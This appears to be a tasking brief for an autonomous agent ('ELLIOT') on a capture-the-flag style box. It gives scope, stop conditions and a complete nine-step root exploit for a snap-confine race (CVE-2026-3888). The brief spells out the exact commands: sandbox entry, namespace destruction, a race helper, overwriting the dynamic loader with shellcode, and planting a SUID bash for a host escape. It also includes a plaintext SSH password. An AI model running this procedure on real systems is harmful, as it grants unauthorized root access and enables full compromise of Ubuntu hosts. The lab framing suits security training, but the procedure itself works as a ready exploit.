scope.objective: Escalate from jonathan to root via CVE-2026-3888. Read /root/root.txt.
in_scope: SSH as jonathan (password: linkinpark) via remote_exec/remote_upload
Running snap-confine directly to enter/destroy sandbox
Using /proc/PID/cwd to access sandbox /tmp from outside
Racing snap-confine mimic creation via AF_UNIX backpressure
Dynamic linker hijacking on SUID snap-confine
Sandbox escape via SUID bash in /var/snap/firefox/common/
scope.out_of_scope: Do not modify system services beyond snap namespace manipulation.
stop_conditions: Exploit fails after 3 attempts — return with diagnostics

primary_path: CVE-2026-3888 snap-confine TOCTOU race. Pre-compiled binaries ready. Follow the 9-step procedure in notes.
backup_path: If race helper fails to detect trigger: check that namespace was properly destroyed in step 4. If systemd-run fails: try without it. If SUID bash escape fails: try writing to /var/snap/firefox/common/ a different way.

vulnerability_primitive.primitive: TOCTOU race in snap-confine mimic creation. After /tmp/.snap is deleted by tmpfiles, attacker recreates it and swaps contents during bind-mount sequence using AF_UNIX backpressure to single-step snap-confine.
delivery_forms: renameat2(RENAME_EXCHANGE) atomic swap of .snap/usr/lib/x86_64-linux-gnu during mimic bind-mount
Dynamic linker (ld-linux-x86-64.so.2) replacement with shellcode ELF
SUID bash at /var/snap/firefox/common/ for sandbox escape
vulnerability_primitive.defenses_observed: Cached namespace requires explicit destruction. /tmp/snap-private-tmp is 0700 root — bypassed via /proc/PID/cwd. AppArmor on snap-confine allows /var/snap/firefox/common/ writes.
untested_forms: All — first attempt with correct procedure

process_model.background: Race helper keeps poisoned namespace alive
process_model.critical_note: This exploit requires 3 concurrent terminal sessions. Use remote_exec for each. The race helper (Terminal 2/Step 5) must stay running — do NOT close it. Use nohup or background processes where needed.

notes:
=== EXACT 9-STEP EXPLOIT PROCEDURE (from official writeup) ===

PRE-COMPILED BINARIES READY AT:
  ../shared/exploit_src/firefox_2404   (race helper, static x86_64)
  ../shared/exploit_src/librootshell.so (ld-linux replacement shellcode)

STEP 0 — Upload binaries to target:
  Upload firefox_2404 and librootshell.so to ~/  on target (jonathan home dir)
  chmod +x ~/firefox_2404

=== TERMINAL 1 — Enter sandbox ===

STEP 1 — Enter the Firefox snap sandbox:
  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
  cd /tmp
  echo $$
  (Note the PID, e.g. 18606)

STEP 2 — Wait for .snap deletion (already happened on this box):
  The 1-minute tmpfiles timer with 4m age means .snap is already gone.
  Verify: stat ./.snap → 'No such file or directory'
  Keep /tmp alive: while test -d ./.snap; do touch ./; sleep 1; done
  (Or just leave Terminal 1 sitting — the process keeps the namespace alive)

=== TERMINAL 2 — Access sandbox /tmp from outside ===

STEP 3 — Use /proc/PID/cwd to bypass 0700 on snap-private-tmp:
  cd /proc/<PID_FROM_STEP1>/cwd
  ls -la
  (Should show the sandbox's /tmp contents)

STEP 4 — Destroy the cached namespace (CRITICAL — this is what ELLIOT was missing):
  systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash
  Then inside that scope:
  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent
  Expected error: 'cannot perform operation: mount --rbind /dev ... No such file or directory'
  The ERROR IS EXPECTED — the failure destroys the cached namespace.
  The --base snapd (invalid base) triggers SC_DISCARD_MUST because the base snap NAME changes from core22 to snapd.
  This forces namespace discard while Terminal 1's /tmp remains alive.

STEP 5 — Run the race helper (stay in /proc/PID/cwd):
  ~/firefox_2404 ~/librootshell.so
  Expected output:
    [*] CVE-2026-3888 — firefox 24.04 helper
    [*] Setting up .snap and .exchange directory...
    [*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
    [*] Starting race against snap-confine...
    [*] Reading snap-confine output (PID XXXX)...
    [!] TRIGGER DETECTED! Swapping .exchange...
    [+] SWAP DONE!
  DO NOT CLOSE THIS TERMINAL — it keeps the poisoned namespace alive.

=== TERMINAL 3 — Exploit the poisoned namespace ===

STEP 6 — Overwrite the dynamic loader:
  PID=$(cat /proc/<STEP1_PID>/cwd/race_pid.txt)
  cat /proc/<STEP1_PID>/cwd/race_perms.txt
  (Should show: jonathan:jonathan 755 — confirming attacker ownership)
  cd /proc/$PID/root
  stat -c '%U:%G' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
  (Should show: jonathan:jonathan)
  cp /usr/bin/busybox ./tmp/sh
  cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2

STEP 7 — Trigger root (execute SUID snap-confine in poisoned namespace):
  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
  Result: BusyBox shell as uid=0(root)
  Verify: id → uid=0(root) gid=1000(jonathan)

STEP 8 — Escape the sandbox:
  cp /bin/bash /var/snap/firefox/common/bash
  chmod 04755 /var/snap/firefox/common/bash
  exit

STEP 9 — Full root on host:
  /var/snap/firefox/common/bash -p
  id → uid=1000(jonathan) gid=1000(jonathan) euid=0(root)
  cat /root/root.txt

=== KEY INSIGHTS ===

1. WHY --base snapd DESTROYS THE NAMESPACE:
   The info file at /run/snapd/ns/snap.firefox.info contains 'base-snap-name=core22'.
   Running with --base snapd makes snap-confine see a base name TRANSITION (core22→snapd).
   This triggers SC_DISCARD_MUST — forced namespace discard regardless of occupancy.

2. WHY /proc/PID/cwd WORKS:
   /proc/PID/cwd follows the process's mount namespace view.
   It bypasses host filesystem permissions (the 0700 on snap-private-tmp).
   This gives us read/write access to the sandbox's /tmp from outside.

3. WHY THE RACE IS DETERMINISTIC:
   AF_UNIX socket with SO_RCVBUF=1 and SO_SNDBUF=1 creates extreme backpressure.
   snap-confine blocks on every write() to stderr.
   The helper reads byte-by-byte, single-stepping snap-confine.
   When trigger detected, snap-confine is FROZEN mid-write — unlimited time to swap.

4. THE MULTI-TERMINAL REQUIREMENT:
   Terminal 1: Keeps sandbox alive (process in namespace preserves /tmp)
   Terminal 2: Destroys cached ns + runs race (must stay open after race)
   Terminal 3: Exploits poisoned namespace
   ELLIOT must use background processes or multiple remote_exec sessions.
